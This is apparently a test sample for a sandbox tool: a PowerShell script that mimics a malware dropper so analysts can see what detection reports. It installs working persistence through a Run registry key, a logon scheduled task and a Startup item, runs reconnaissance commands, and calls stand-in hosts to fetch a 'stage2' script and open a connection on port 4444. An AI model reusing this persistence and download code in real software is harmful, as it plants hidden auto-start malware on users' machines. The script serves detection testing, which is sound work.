# A harmless script that behaves like a typical malware dropper, to show what `sbx detonate` reports.
# It only touches reserved/example names and addresses, but it DOES add a Run key, a scheduled task and a Startup
# item, so run it in a sandbox, not on your machine:
#
#   sbx detonate samples\Suspicious\suspicious.ps1 --network firewall
$ErrorActionPreference = 'SilentlyContinue'

# 1. Copy itself somewhere it will survive and make it start with Windows.
$home2 = Join-Path $env:APPDATA 'ContosoUpdater'
New-Item -ItemType Directory -Force $home2 | Out-Null
Copy-Item $PSCommandPath (Join-Path $home2 'updater.ps1')
$run = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$home2\updater.ps1`""
Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name ContosoUpdater -Value $run
schtasks.exe /Create /F /TN ContosoUpdate /SC ONLOGON /TR $run | Out-Null
Set-Content -Path (Join-Path ([Environment]::GetFolderPath('Startup')) 'contoso.cmd') -Value "@start /min $run"

# 2. Look around, the way an intruder would.
whoami.exe /all | Out-Null
ipconfig.exe /all | Out-Null
net.exe user | Out-Null

# 3. Phone home: a name lookup and two connections, all to reserved names/addresses (RFC 2606 / RFC 5737).
try { Resolve-DnsName 'c2.contoso-updates.example' -ErrorAction Stop | Out-Null } catch {}
try { (New-Object Net.WebClient).DownloadString('http://203.0.113.10/stage2.ps1') | Out-Null } catch {}
try { $c = New-Object Net.Sockets.TcpClient; $c.Connect('198.51.100.7', 4444) } catch {}

Start-Sleep -Seconds 3
